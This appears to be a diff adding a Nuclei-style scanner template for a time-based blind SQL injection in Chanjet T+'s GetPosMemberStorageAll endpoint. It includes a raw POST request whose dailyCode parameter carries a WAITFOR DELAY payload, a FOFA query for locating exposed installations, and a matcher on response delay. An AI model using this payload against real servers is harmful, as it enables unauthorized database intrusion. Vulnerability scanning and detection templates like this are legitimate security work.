@@ -1,0 +1,29 @@
+id: poc-nrgamuy7tpzmlxbe
+info:
+  name: 畅捷通T+ GetPosMemberStorageAll存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nrgamuy7tpzmlxbe
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nrgamuy7tpzmlxbe
+    fofa: app="畅捷通-TPlus"
+http:
+- raw:
+  - 'POST /tplus/POSSyncService.asmx/GetPosMemberStorageAll HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    accNum=1&poscode=1&shiftCode=1&dailyCode=1'';WAITFOR DELAY ''0:0:5''--'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
